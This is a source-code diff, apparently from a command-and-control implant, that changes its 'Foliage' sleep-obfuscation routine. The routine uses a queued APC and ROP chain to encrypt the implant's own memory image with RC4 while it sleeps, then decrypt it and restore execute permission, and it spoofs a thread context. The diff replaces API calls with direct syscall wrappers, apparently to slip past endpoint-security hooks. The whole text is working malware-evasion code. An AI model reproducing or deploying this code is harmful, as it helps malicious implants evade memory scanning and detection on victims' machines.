@@ -4,6 +4,7 @@
 #include <Core/SleepObf.h>
 #include <Core/Win32.h>
 #include <Core/MiniStd.h>
+#include <Core/Thread.h>
 
 #include <rpcndr.h>
 #include <ntstatus.h>
@@ -76,9 +77,9 @@ VOID FoliageObf(
     Rc4.Buffer = ImageBase;
     Rc4.Length = Rc4.MaximumLength = ImageSize;
 
-    if ( NT_SUCCESS( Instance.Win32.NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
+    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
     {
-        if ( NT_SUCCESS( Instance.Win32.NtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
+        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
         {
             RopInit     = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
             RopCap      = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
@@ -215,18 +216,18 @@ VOID FoliageObf(
                     *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Win32.NtTestAlert );
                     // RtlExitUserThread( ERROR_SUCCESS );
 
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance.Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;
 
-                    if ( NT_SUCCESS( Instance.Win32.NtAlertResumeThread( hThread, NULL ) ) )
+                    if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                     {
                         RopSpoof->ContextFlags = CONTEXT_FULL;
                         RopSpoof->Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
@@ -242,86 +243,72 @@ VOID FoliageObf(
     }
 
 Leave:
-    if ( RopExitThd != NULL )
-    {
+    if ( RopExitThd != NULL ) {
         Instance.Win32.LocalFree( RopExitThd );
         RopExitThd = NULL;
     }
 
-    if ( RopSetCtx2 != NULL )
-    {
+    if ( RopSetCtx2 != NULL ) {
         Instance.Win32.LocalFree( RopSetCtx2 );
         RopSetCtx2 = NULL;
     }
 
-    if ( RopSetMemRx != NULL )
-    {
+    if ( RopSetMemRx != NULL ) {
         Instance.Win32.LocalFree( RopSetMemRx );
         RopSetMemRx = NULL;
     }
 
-    if ( RopMemDec != NULL )
-    {
+    if ( RopMemDec != NULL ) {
         Instance.Win32.LocalFree( RopMemDec );
         RopMemDec = NULL;
     }
 
-    if ( RopWaitObj != NULL )
-    {
+    if ( RopWaitObj != NULL ) {
         Instance.Win32.LocalFree( RopWaitObj );
         RopWaitObj = NULL;
     }
 
-    if ( RopSetCtx != NULL )
-    {
+    if ( RopSetCtx != NULL ) {
         Instance.Win32.LocalFree( RopSetCtx );
         RopSetCtx = NULL;
     }
 
-    if ( RopSetMemRw != NULL )
-    {
+    if ( RopSetMemRw != NULL ) {
         Instance.Win32.LocalFree( RopSetMemRw );
         RopSetMemRw = NULL;
     }
 
-    if ( RopBegin != NULL )
-    {
+    if ( RopBegin != NULL ) {
         Instance.Win32.LocalFree( RopBegin );
         RopBegin = NULL;
     }
 
-    if ( RopSpoof != NULL )
-    {
+    if ( RopSpoof != NULL ) {
         Instance.Win32.LocalFree( RopSpoof );
         RopSpoof = NULL;
     }
 
-    if ( RopCap != NULL )
-    {
+    if ( RopCap != NULL ) {
         Instance.Win32.LocalFree( RopCap );
         RopCap = NULL;
     }
 
-    if ( RopInit != NULL )
-    {
+    if ( RopInit != NULL ) {
         Instance.Win32.LocalFree( RopInit );
         RopInit = NULL;
     }
 
-    if ( hDupObj != NULL )
-    {
+    if ( hDupObj != NULL ) {
         SysNtClose( hDupObj );
         hDupObj = NULL;
     }
 
-    if ( hThread != NULL )
-    {
-        Instance.Win32.NtTerminateThread( hThread, STATUS_SUCCESS );
+    if ( hThread != NULL ) {
+        SysNtTerminateThread( hThread, STATUS_SUCCESS );
         hThread = NULL;
     }
 
-    if ( hEvent != NULL )
-    {
+    if ( hEvent != NULL ) {
         SysNtClose( hEvent );
         hEvent = NULL;
     }
